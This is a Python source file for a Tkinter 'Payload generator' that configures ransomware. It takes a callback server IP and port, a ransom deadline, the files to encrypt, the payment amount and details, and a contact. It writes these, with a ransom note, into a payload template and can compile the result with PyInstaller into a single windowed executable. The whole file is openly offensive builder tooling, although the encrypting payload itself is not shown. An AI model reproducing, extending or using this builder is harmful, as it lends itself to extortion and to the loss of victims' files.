from tkinter import *
from tkinter.filedialog import askopenfilename
import uuid, random
from .message import UserMessage, generate_default
import PyInstaller.__main__

class Generator:
    """
    Generates new payloads with custom specifications
    """
    def __init__(self, payload_src, target_path):
        """
        Initiates interface
        :param payload_src: str; payload source file
        :param target_path: str; target path for new generated payload
        """
        self.payload_src = payload_src
        self.target_path = target_path

        self.window = Tk()
        self.window.title("Payload generator")
        self.window.geometry('500x400')
        self.window.resizable(False, False)
        self.target_files = None
        self.ui = IntVar()
        self.message = None
        self.__set_server_details()
        self.__set_ransom_details()
        self.__set_payment_details()
        self.__set_payload_data()
        self.__set_buttons()
        self.window.mainloop()

    def __set_server_details(self):
        """
        Sets server details UI component. Defines what server's ip and port addresses
        the payload will be connecting to
        """
        l = LabelFrame(self.window, text="Server")
        l.grid_columnconfigure((0,1), weight=1)
        Label(l, text = "IP").grid(row=0, column=0)
        self.ip_box = Text(l, height=1, width=20)
        self.ip_box.grid(row=0, column=1, padx=(10, 10), pady=2)
        Label(l, text="Port").grid(row=1, column=0)
        self.port_box = Text(l, height=1, width=20)
        self.port_box.grid(row=1, column=1, pady=2)
        l.place(x=10, y=10)

    def __set_ransom_details(self):
        """
        Defines ransom's details:
        * time limit
        * target files to encrypt
        """
        l = LabelFrame(self.window, text="Ransom")
        l.grid_columnconfigure((0, 1), weight=1)
        # ransom time
        Label(l, text="Ransom time (hours)").grid(row=0, column=0)
        self.ransom_time = Text(l, height=1, width=10)
        self.ransom_time.grid(row=0, column=1)

        Button(l, text="Target files", command=self.__ask_target_files).grid(row=1, column=0)
        self.target_files_box = Text(l, height=1, width=40)
        self.target_files_box.grid(row=1, column=1, padx=(10, 10))
        l.place(x=10, y=80)

    def __set_payment_details(self):
        """
        Defines payment details:
        * payment amount
        * payment address a
        * contact details
        """
        l = LabelFrame(self.window, text="Payment")
        # amount
        Label(l, text="Payment amount").grid(row=0, column=0, padx=5)
        self.payment_box = Text(l, height=1, width=20)
        self.payment_box.grid(row=0, column=1, padx=5, pady=2)
        # payment details
        Label(l, text="Payment details").grid(row=1, column=0)
        self.payment_details = Text(l, height=1, width=20)
        self.payment_details.grid(row=1, column=1, pady=2)
        # contact
        Label(l, text="Contact").grid(row=2, column=0)
        self.contact = Text(l, height=1, width=20)
        self.contact.grid(row=2, column=1, pady=2)

        l.place(x=10, y=150)

    def __set_payload_data(self):
        """
        Sets further payload's data:
        * user interface: textual (console) or graphic (window)
        * user display message
        * payload's id number
        * payload's file name
        """
        l = LabelFrame(self.window, text="Payload")
        ui_frame = Frame(l)
        ui_frame.grid_columnconfigure((0, 1), weight=1)
        ui_frame.pack()
        Label(ui_frame, text="UI:").grid(row=0, column=0)
        self.gui_option = Radiobutton(ui_frame, text="GUI", variable=self.ui, value=0)
        self.gui_option.grid(row=0, column=1, padx=(5, 5))
        self.console_option = Radiobutton(ui_frame, text="Console", variable=self.ui, value=1)
        self.console_option.grid(row=0, column=2)
        Button(ui_frame, text="User message", command=self.__run_user_message).grid(row=0, column=3, padx=(10, 10))

        frame = Frame(l)
        frame.pack()
        Label(frame, text="Target filename: ").grid(row=0, column=0)
        self.filename_box = Text(frame, height=1, width=20)
        self.filename_box.grid(row=0, column=1, padx=(5, 5))

        id_frame = Frame(l)
        id_frame.pack()
        Label(id_frame, text="ID: ").grid(row=0, column=0)
        self.id_box = Text(id_frame, height=1, width=20)
        self.id_box.grid(row=0, column=1, padx=(5, 5))
        Button(id_frame, text="Generate", command=self.__generate_id).grid(row=0, column=3, padx=(10, 10))

        l.place(x=10, y=250)


    def __set_buttons(self):
        """
        Sets generation buttons
        """
        Button(self.window, text="Generate Payload", command=self.__generate).place(x=50, y=360)
        Button(self.window, text="Generate and compile", command='').place(x=180, y=360)

    def __generate_id(self):
        """
        Generates new payload's id and set the value in the id text box
        """
        rd = random.Random()
        rd.seed(0)
        self.id_box.delete('1.0', END)
        self.id_box.insert(INSERT, str(uuid.UUID(int=rd.getrandbits(128))))

    def __ask_target_files(self):
        """
        Displays files selection dialog window an save the selected files as payload's target files
        """
        self.target_files = askopenfilename(initialdir="/", title="Select file", filetypes=[("Json files", "*.json")])
        self.target_files_box.delete(1.0, END)
        self.target_files_box.insert(END, self.target_files)

    def __create_user_message(self):
        """
        Creates new user message
        :return: str
        """
        return UserMessage(self.id_box.get("1.0", "end-1c"),
                        self.ransom_time.get("1.0", "end-1c"),
                        self.payment_box.get("1.0", "end-1c"),
                        self.payment_details.get("1.0", "end-1c"),
                        self.contact.get("1.0", "end-1c"))

    def __run_user_message(self):
        """
        Runs user message creation window
        """
        m = self.__create_user_message()
        self.message = m.run()

    def __generate(self):
        """
        Executes new payload generation and saves it in the target folder
        """
        _id = self.id_box.get("1.0", "end-1c")
        time = int(self.ransom_time.get("1.0", "end-1c"))
        ip = self.ip_box.get("1.0", "end-1c")
        port = int(self.port_box.get("1.0", "end-1c"))
        ui = int(self.ui.get())
        payment = self.payment_box.get("1.0", "end-1c")
        payment_details = self.payment_details.get("1.0", "end-1c")
        contact = self.contact.get("1.0", "end-1c")
        payload_json = '{{"id":"{}", "payment":{}, "paymentDetails":"{}", "timeLimit":{}, "contact":"{}", "UI": {}, ' \
                       '"server":{{"ip":"{}", "port":{}}} }}'.\
            format(_id, payment, payment_details, time, contact, ui, ip, port)

        files_json = self.target_files_box.get("1.0", "end-1c")
        filename = self.target_path + self.filename_box.get("1.0", "end-1c")

        self.message = generate_default(_id, payment, payment_details, time, contact) if not self.message else self.message

        with open(self.payload_src) as payload_file, open(files_json) as files, open(filename, "w+") as target_file:
            code = payload_file.read()
            code = code.replace('<JSON_TEXT>', payload_json).replace("'<FILES_JSON>'",
                                                                     "'''" + files.read() + "'''").replace('<MESSAGE>',
                                                                                                           self.message)
            target_file.write(code)

        #self.window.destory()

    def __compile(self):
        """
        Compiles the new generated payload
        """
        filename =  self.filename_box.get("1.0", "end-1c") + '.py'
        PyInstaller.__main__.run([
            filename,
            '--onefile',
            '--windowed'
        ])